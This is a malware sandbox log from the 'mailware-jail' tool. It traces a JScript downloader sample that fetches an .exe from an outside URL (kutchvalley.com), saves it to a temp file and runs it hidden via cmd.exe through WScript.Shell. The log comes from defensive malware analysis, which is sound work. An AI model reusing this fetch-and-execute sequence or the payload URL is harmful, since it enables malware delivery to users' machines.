7 Oct 21:57:26 - mailware-jail, a malware sandbox ver. 0.8
7 Oct 21:57:26 - ------------------------
7 Oct 21:57:26 - Sandbox environment sequence: env/utils.js,env/eval.js,env/function.js,env/wscript.js,env/browser.js,env/agents.js,env/other.js,env/console.js
7 Oct 21:57:26 - Malware files: malware/20161007/3c1ab04d15fdc84afbf819df546359c8df9a8c303c67c90ce28a4417d9039393.js
7 Oct 21:57:26 - Output file for sandbox dump: sandbox_dump_after.json
7 Oct 21:57:26 - Output directory for generated files: output/
7 Oct 21:57:26 - ==> Preparing Sandbox environment.
7 Oct 21:57:26 -  => Executing: env/utils.js
7 Oct 21:57:26 -  => Executing: env/eval.js
7 Oct 21:57:26 - Preparing sandbox to intercept eval() calls.
7 Oct 21:57:26 -  => Executing: env/function.js
7 Oct 21:57:26 - Preparing sandbox to intercept 'new Function()' calls.
7 Oct 21:57:26 -  => Executing: env/wscript.js
7 Oct 21:57:26 - Preparing sandbox to emulate WScript environment.
7 Oct 21:57:26 -  => Executing: env/browser.js
7 Oct 21:57:26 - Preparing sandbox to emulate Browser environment (default = IE11).
7 Oct 21:57:26 - Created: window[1]
7 Oct 21:57:26 - Created: document[2]
7 Oct 21:57:26 - document[2].createElement(html)
7 Oct 21:57:26 - Element[3] created, named: 'html'
7 Oct 21:57:26 - document[2].createElement(body)
7 Oct 21:57:26 - Element[5] created, named: 'body'
7 Oct 21:57:26 - document[2].body = 'Element[5]'
7 Oct 21:57:26 - document[2].createElement(head)
7 Oct 21:57:26 - Element[7] created, named: 'head'
7 Oct 21:57:26 - Element[3].appendChild(Element[7])
7 Oct 21:57:26 - Element[3].firstChild set
7 Oct 21:57:26 - document[2].body.get() => Element[5]
7 Oct 21:57:26 - Element[3].appendChild(Element[5])
7 Oct 21:57:26 -  => Executing: env/agents.js
7 Oct 21:57:26 - Setting Browser environment to: IE8 on Win10 64bit
7 Oct 21:57:26 - window[1].userAgent.get() => Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/7.0; Touch; .NET4.0C; .NET4.0E; . ... (truncated)
7 Oct 21:57:26 -  => Executing: env/other.js
7 Oct 21:57:26 -  => Executing: env/console.js
7 Oct 21:57:26 - ==> Executing malware file(s).
7 Oct 21:57:26 -  => Executing: malware/20161007/3c1ab04d15fdc84afbf819df546359c8df9a8c303c67c90ce28a4417d9039393.js
7 Oct 21:57:26 - Calling 'new Function(`var orqasnakri = WScript.CreateObject('WScript.Shell'); var fcoppohwura9 = orqasnakri.CreateShortcut('\qvertyd.lnk'); return fcoppohwura9.TargetPath;`)'
7 Oct 21:57:26 - args: util_log(`Calling function() {var orqasnakri = WScript.CreateObject('WScript.Shell'); var fcoppohwura9 = orqasnakri.Cr ... (truncated)(`+Array.prototype.slice.call(arguments).join(", ")+`)`);var ret = function() {var orqasnakri = WScript.CreateObject('WScript.Shell'); var fcoppohwura9 = orqasnakri.CreateShortcut('\qvertyd.lnk'); return fcoppohwura9.TargetPath;}(); util_log("Returning: '"+ret+"'"); return ret;
7 Oct 21:57:26 - Calling function() {var orqasnakri = WScript.CreateObject('WScript.Shell'); var fcoppohwura9 = orqasnakri.Cr ... (truncated)()
7 Oct 21:57:26 - WScript.CreateObject(WScript.Shell)
7 Oct 21:57:26 - Created: WScript.Shell[9]
7 Oct 21:57:26 - WScript.CreateShortcut(qvertyd.lnk)
7 Oct 21:57:26 - Created: WshShortcut[10](qvertyd.lnk)
7 Oct 21:57:26 - WshShortcut[10](qvertyd.lnk).TargetPath.get() => (string) ''
7 Oct 21:57:26 - Returning: ''
7 Oct 21:57:26 - WScript.CreateObject(Scripting.FileSystemObject)
7 Oct 21:57:26 - Scripting.FileSystemObject[11] created.
7 Oct 21:57:26 - WScript.CreateObject(WScript.Shell)
7 Oct 21:57:26 - Created: WScript.Shell[12]
7 Oct 21:57:26 - WScript.CreateObject(MSXML2.XMLHTTP)
7 Oct 21:57:26 - Created: MSXML2.XMLHTTP[13]
7 Oct 21:57:26 - WScript.CreateObject(ADODB.Stream)
7 Oct 21:57:26 - Created: ADODB_Stream[14]
7 Oct 21:57:26 - Scripting.FileSystemObject[11].GetSpecialFolder(2) => TemporaryFolder/
7 Oct 21:57:26 - Scripting.FileSystemObject[11].GetTempName() => TempFile[15]
7 Oct 21:57:26 - MSXML2.XMLHTTP[13].open(GET,http://kutchvalley.com/creative/wp-admin/css/colors/midnight/gNcCTV.exe,0)
7 Oct 21:57:26 - MSXML2.XMLHTTP[13].async = (boolean) 'false'
7 Oct 21:57:26 - MSXML2.XMLHTTP[13].async.get() => (boolean) 'false'
7 Oct 21:57:26 - MSXML2.XMLHTTP[13].send(undefined)
7 Oct 21:57:27 - MSXML2.XMLHTTP[13].onreadystatechange(), readyState = 4 length: 0 status: 301
7 Oct 21:57:27 - MSXML2.XMLHTTP[13] statusText = null
7 Oct 21:57:27 - MSXML2.XMLHTTP[13].responseBody = (object) ''
7 Oct 21:57:27 - MSXML2.XMLHTTP[13].status = (number) '301'
7 Oct 21:57:27 - MSXML2.XMLHTTP[13].onreadystatechange() undefined
7 Oct 21:57:27 - MSXML2.XMLHTTP[13].send(undefined) finished
7 Oct 21:57:27 - ADODB_Stream[14].type = (string) '1'
7 Oct 21:57:27 - MSXML2.XMLHTTP[13].ResponseBody.get() => (object) ''
7 Oct 21:57:27 - ADODB_Stream[14].Open()
7 Oct 21:57:27 - ADODB_Stream[14].content = (object) ''
7 Oct 21:57:27 - ADODB_Stream[14].Write(str) - 0 bytes
7 Oct 21:57:27 - ADODB_Stream[14].size = (number) '0'
7 Oct 21:57:27 - ADODB_Stream[14].SaveToFile(TemporaryFolder/TempFile[15], undefined)
7 Oct 21:57:27 - ADODB_Stream[14].content.get() => (object) ''
7 Oct 21:57:27 - ADODB_Stream[14].Close()
7 Oct 21:57:27 - WScript.Shell[12].Run(cmd.exe /c TemporaryFolder/TempFile[15], 0, undefined)
7 Oct 21:57:27 - ==> Cleaning up sandbox.
7 Oct 21:57:27 - ==> Script execution finished, dumping sandbox environment to a file.
7 Oct 21:57:27 - MSXML2.XMLHTTP[13].ResponseBody.get() => (object) ''
7 Oct 21:57:27 - Saving: output/TemporaryFolder_TempFile[15]
7 Oct 21:57:27 - Generated file saved
7 Oct 21:57:27 - The sandbox context has been  saved to: sandbox_dump_after.json
